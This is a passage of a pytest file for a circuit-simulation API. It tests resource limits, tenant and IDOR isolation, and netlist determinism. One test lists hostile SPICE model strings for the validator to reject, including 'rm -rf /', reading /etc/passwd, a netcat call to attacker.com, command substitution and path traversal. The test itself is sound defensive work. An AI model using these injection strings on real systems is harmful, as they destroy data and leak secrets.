        assert prov_data["verification_status"] == "NOT_VERIFIED"
        assert prov_data["classification"] == "CALCULATED_RESULT"

    # 41. Resource limits enforcement: rejects oversized circuits and netlists
    def test_41_resource_limits_enforced(self):
        c = Circuit(id="c-oversized", project_id="p1", name="Oversized", created_by="u1")
        # Generate 550 components (exceeding MAX_ELEMENT_COUNT of 500)
        c.components = [
            Component(id=f"r-{i}", circuit_id=c.id, ref_des=f"R{i}", component_type="RESISTOR", value="1k")
            for i in range(550)
        ]
        c.nets = [Net(id="n0", circuit_id=c.id, name="GND")]
        c.connections = []

        res = NetlistGenerator.generate(c)
        assert res.is_valid is False
        assert any("RESOURCE_LIMIT_EXCEEDED" in err for err in res.errors)

    # 42. Staleness detection: circuit revision change renders previous simulation stale
    def test_42_simulation_staleness_detection(self):
        job = SimulationJob(
            id="job-old",
            circuit_id="c1",
            circuit_version=1,
            project_id="p1",
            created_by="u1",
            status=SimulationStatus.COMPLETED.value,
        )
        current_circuit = Circuit(id="c1", project_id="p1", name="Rev 2", version=2, created_by="u1")
        # Job version 1 < Circuit version 2 -> stale!
        is_stale = job.circuit_version < current_circuit.version
        assert is_stale is True

    # 43. Tenant / IDOR isolation: rejects cross-tenant access to simulation job
    @pytest.mark.asyncio
    async def test_43_tenant_idor_isolation(self, async_client):
        from app.core.database import AsyncSessionLocal
        from app.core.security import create_access_token
        from app.models.db.project import Project, ProjectStatus, ProjectType
        import uuid

        tenant_a = "tenant-idor-a"
        tenant_b = "tenant-idor-b"
        user_a = "user-a"
        user_b = "user-b"
        token_b = create_access_token(user_b, claims={"role": "user", "plan": "pro", "tenant_id": tenant_b})
        headers_b = {"Authorization": f"Bearer {token_b}"}

        # Seed simulation owned by Tenant A
        async with AsyncSessionLocal() as db:
            proj = Project(id=str(uuid.uuid4()), tenant_id=tenant_a, name="A Proj", owner_id=user_a, project_type=ProjectType.CIRCUIT.value, status=ProjectStatus.ACTIVE.value)
            circ = Circuit(id=str(uuid.uuid4()), project_id=proj.id, tenant_id=tenant_a, name="A Circ", version=1, created_by=user_a)
            job = SimulationJob(
                id=str(uuid.uuid4()),
                tenant_id=tenant_a,
                project_id=proj.id,
                circuit_id=circ.id,
                circuit_version=1,
                created_by=user_a,
                simulation_type=SimulationType.DC_OPERATING_POINT.value,
                status=SimulationStatus.COMPLETED.value,
            )
            db.add_all([proj, circ, job])
            await db.commit()
            job_id = job.id
            circ_id = circ.id

        # Tenant B attempts to fetch Tenant A's simulation job
        res = await async_client.get(
            f"/api/v1/circuits/{circ_id}/simulations/{job_id}",
            headers=headers_b,
        )
        assert res.status_code == 404

    # 44. Malicious model injection defense: rejects command injection and traversal
    def test_44_malicious_model_injection_defense(self):
        malicious_payloads = [
            ".model M1 D ; rm -rf /",
            ".model M2 D && cat /etc/passwd",
            ".model M3 D | nc attacker.com 4444",
            ".model M4 D `whoami`",
            ".model M5 D $(id)",
            ".include ../../secrets.env",
            ".include ..\\..\\windows\\system32",
            ".sys format C:",
            "shell powershell.exe",
        ]
        for payload in malicious_payloads:
            ok, err = SpiceModelRegistry.validate_model_text(payload)
            assert ok is False, f"Payload should have been rejected: {payload}"
            assert err is not None

    # 45. Simulation failure does not falsely trigger requirement violation
    def test_45_simulator_failure_does_not_mark_engineering_violation(self):
        c = Circuit(id="c-fail", project_id="p1", name="Failure Semantics", created_by="u1")
        r1 = Component(id="r1", circuit_id=c.id, ref_des="R1", component_type="RESISTOR", value="1k", metadata_={"max_voltage": 10.0})
        c.components = [r1]

        # Simulation failed / non-convergent -> empty node voltages
        evals = SimulationInterpretationService.evaluate_constraints(
            circuit=c,
            node_voltages={},  # No node voltages due to failure
            branch_currents={},
        )
        # Should not falsely report VIOLATED!
        assert all(e.status != "VIOLATED" for e in evals)

    # 46. MockSimulator strictly enforces TEST_MOCK execution mode boundary
    def test_46_mock_simulator_limitations_boundary(self):
        mock_sim = MockSimulator()
        assert mock_sim.simulator_name == SimulatorType.MOCK_SPICE.value
        assert mock_sim.simulator_version == "1.0-mock"
        # Must not claim to be ngspice
        assert mock_sim.simulator_name != "NGSPICE"

    # 47. Netlist Determinism: identical engineering state produces identical canonical netlist and digest
    def test_47_netlist_determinism_canonical_digest(self):
        import copy
        c1 = Circuit(id="c-det-1", project_id="p1", name="Deterministic Circuit", version=1, created_by="u1")
        r1 = Component(id="r1", circuit_id="c-det-1", ref_des="R1", component_type="RESISTOR", value="1k")
        r2 = Component(id="r2", circuit_id="c-det-1", ref_des="R2", component_type="RESISTOR", value="2k")
        v1 = Component(id="v1", circuit_id="c-det-1", ref_des="V1", component_type="VOLTAGE_SOURCE", value="5V")
        n_in = Net(id="net-in", circuit_id="c-det-1", name="VIN")
        n_mid = Net(id="net-mid", circuit_id="c-det-1", name="VMID")
        n_gnd = Net(id="net-gnd", circuit_id="c-det-1", name="GND")
        c1.components = [r1, r2, v1]
        c1.nets = [n_in, n_mid, n_gnd]
        c1.connections = [
            Connection(id="c1", circuit_id="c-det-1", component_id="v1", pin_number="1", net_id="net-in"),
            Connection(id="c2", circuit_id="c-det-1", component_id="v1", pin_number="2", net_id="net-gnd"),
            Connection(id="c3", circuit_id="c-det-1", component_id="r1", pin_number="1", net_id="net-in"),
            Connection(id="c4", circuit_id="c-det-1", component_id="r1", pin_number="2", net_id="net-mid"),
            Connection(id="c5", circuit_id="c-det-1", component_id="r2", pin_number="1", net_id="net-mid"),
            Connection(id="c6", circuit_id="c-det-1", component_id="r2", pin_number="2", net_id="net-gnd"),
        ]

        # Circuit 2 has elements, nets, and connections in reversed/shuffled order
        c2 = Circuit(id="c-det-1", project_id="p1", name="Deterministic Circuit", version=1, created_by="u1")
        c2.components = [
            Component(id="v1", circuit_id="c-det-1", ref_des="V1", component_type="VOLTAGE_SOURCE", value="5V"),
            Component(id="r2", circuit_id="c-det-1", ref_des="R2", component_type="RESISTOR", value="2k"),
            Component(id="r1", circuit_id="c-det-1", ref_des="R1", component_type="RESISTOR", value="1k"),
        ]
        c2.nets = [
            Net(id="net-gnd", circuit_id="c-det-1", name="GND"),
            Net(id="net-in", circuit_id="c-det-1", name="VIN"),
            Net(id="net-mid", circuit_id="c-det-1", name="VMID"),
        ]
        c2.connections = [
            Connection(id="cn6", circuit_id="c-det-1", component_id="r2", pin_number="2", net_id="net-gnd"),
            Connection(id="cn5", circuit_id="c-det-1", component_id="r2", pin_number="1", net_id="net-mid"),
            Connection(id="cn4", circuit_id="c-det-1", component_id="r1", pin_number="2", net_id="net-mid"),
            Connection(id="cn3", circuit_id="c-det-1", component_id="r1", pin_number="1", net_id="net-in"),
            Connection(id="cn2", circuit_id="c-det-1", component_id="v1", pin_number="2", net_id="net-gnd"),
            Connection(id="cn1", circuit_id="c-det-1", component_id="v1", pin_number="1", net_id="net-in"),
        ]

        res1 = NetlistGenerator.generate(c1)
        res2 = NetlistGenerator.generate(c2)

        assert res1.is_valid is True
        assert res2.is_valid is True
        assert res1.netlist == res2.netlist
        assert res1.netlist_digest == res2.netlist_digest

    # 48. API route IDOR: accessing a simulation under wrong circuit_id is rejected with 404
    @pytest.mark.asyncio
    async def test_48_api_routes_idor_cross_circuit_rejected(self, async_client):
        from app.core.database import AsyncSessionLocal
        from app.core.security import create_access_token
        from app.models.db.project import Project, ProjectStatus, ProjectType
        import uuid

        tenant_id = "tenant-idor-cross-1"
        user_id = "user-idor-cross-1"
        token = create_access_token(user_id, claims={"role": "user", "plan": "pro", "tenant_id": tenant_id})
        headers = {"Authorization": f"Bearer {token}"}

        async with AsyncSessionLocal() as db:
            proj = Project(id=str(uuid.uuid4()), tenant_id=tenant_id, name="Proj Cross", owner_id=user_id, project_type=ProjectType.CIRCUIT.value, status=ProjectStatus.ACTIVE.value)
            circ_a = Circuit(id=str(uuid.uuid4()), project_id=proj.id, tenant_id=tenant_id, name="Circ A", version=1, created_by=user_id)
            circ_b = Circuit(id=str(uuid.uuid4()), project_id=proj.id, tenant_id=tenant_id, name="Circ B", version=1, created_by=user_id)
            # Job belongs to Circuit A
            job_a = SimulationJob(
                id=str(uuid.uuid4()),
                tenant_id=tenant_id,
                project_id=proj.id,
                circuit_id=circ_a.id,
                circuit_version=1,
                created_by=user_id,
                simulation_type=SimulationType.DC_OPERATING_POINT.value,
                status=SimulationStatus.COMPLETED.value,
            )
            db.add_all([proj, circ_a, circ_b, job_a])
            await db.commit()
            circ_a_id = circ_a.id
            circ_b_id = circ_b.id
            job_a_id = job_a.id

        # Querying Job A under Circuit B must return 404
        res = await async_client.get(
            f"/api/v1/circuits/{circ_b_id}/simulations/{job_a_id}",
            headers=headers,
        )
        assert res.status_code == 404
        assert "Simulation job does not belong to circuit" in res.json()["detail"]


